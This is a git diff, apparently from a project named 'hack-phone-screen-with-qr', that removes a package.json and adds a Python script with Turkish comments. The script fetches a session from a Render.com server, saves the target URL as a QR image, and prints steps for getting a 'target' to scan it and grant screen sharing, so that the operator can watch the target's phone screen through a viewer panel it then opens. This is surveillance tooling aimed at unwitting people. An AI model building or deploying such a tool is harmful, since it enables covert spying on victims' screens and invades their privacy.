@@ -1,15 +1,107 @@
-{
-  "name": "hack-phone-screen-with-qr",
-  "version": "1.0.0",
-  "description": "QR Kod ile Ekran İzleme",
-  "main": "server.js",
-  "scripts": {
-    "start": "node server.js"
-  },
-  "dependencies": {
-    "express": "^4.18.2",
-    "qrcode": "^1.5.3",
-    "uuid": "^9.0.1",
-    "ws": "^8.16.0"
-  }
-}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import qrcode
+import requests
+import os
+import sys
+
+# Render.com URL'si
+SERVER_URL = "https://hack-phone-screen-with-qr.onrender.com"
+
+def generate_qr():
+    try:
+        print("🎯 QR Kod oluşturuluyor...")
+        response = requests.get(f"{SERVER_URL}/generate", timeout=15)
+        data = response.json()
+
+        if not data.get('success'):
+            print("❌ QR kod oluşturulamadı")
+            return None
+
+        session_id = data['sessionId']
+        target_url = data['targetUrl']
+        viewer_url = data['viewerUrl']
+
+        # QR kod oluştur
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_H,
+            box_size=10,
+            border=4,
+        )
+        qr.add_data(target_url)
+        qr.make(fit=True)
+
+        qr_image = qr.make_image(fill_color="black", back_color="white")
+        qr_image.save('target_qr.png')
+
+        print(f"""
+{'='*60}
+✅ QR KOD OLUŞTURULDU!
+
+📱 Target URL: {target_url}
+🔑 Session ID: {session_id}
+📁 QR Kod: target_qr.png
+
+🎯 İzleme Paneli: {viewer_url}
+
+KULLANIM:
+1. target_qr.png dosyasını hedefe göster
+2. Hedef QR kodu okutsun (kamera veya tarayıcı)
+3. Yukarıdaki İzleme Paneli linkini aç
+4. Hedef "Ekran Paylaşımına İzin Ver" dediğinde izleme başlar
+{'='*60}
+        """)
+
+        # İzleme URL'sini panoya kopyala (isteğe bağlı)
+        try:
+            import pyperclip
+            pyperclip.copy(viewer_url)
+            print("📋 İzleme URL'si panoya kopyalandı!")
+        except:
+            pass
+
+        return {
+            'session_id': session_id,
+            'target_url': target_url,
+            'viewer_url': viewer_url,
+            'qr_file': 'target_qr.png'
+        }
+
+    except requests.exceptions.Timeout:
+        print("⏱️ Sunucu yanıt vermiyor, Render.com'u kontrol et")
+        return None
+    except Exception as e:
+        print(f"❌ Hata: {e}")
+        return None
+
+def check_server():
+    """Sunucunun aktif olup olmadığını kontrol et"""
+    try:
+        response = requests.get(f"{SERVER_URL}/health", timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            print(f"✅ Sunucu aktif! Aktif oturum: {data.get('activeSessions', 0)}")
+            return True
+    except:
+        pass
+    print("❌ Sunucu erişilemez")
+    return False
+
+if __name__ == "__main__":
+    print("🔥 QR Ekran İzleme - Render.com Edition\n")
+
+    # Sunucu kontrolü
+    if not check_server():
+        print("Sunucu başlatılıyor, 30 saniye sonra tekrar dene...")
+        sys.exit(1)
+
+    # QR kod oluştur
+    result = generate_qr()
+
+    if result:
+        # İzleme URL'sini otomatik aç (isteğe bağlı)
+        import webbrowser
+        print("🌐 İzleme paneli açılıyor...")
+        webbrowser.open(result['viewer_url'])
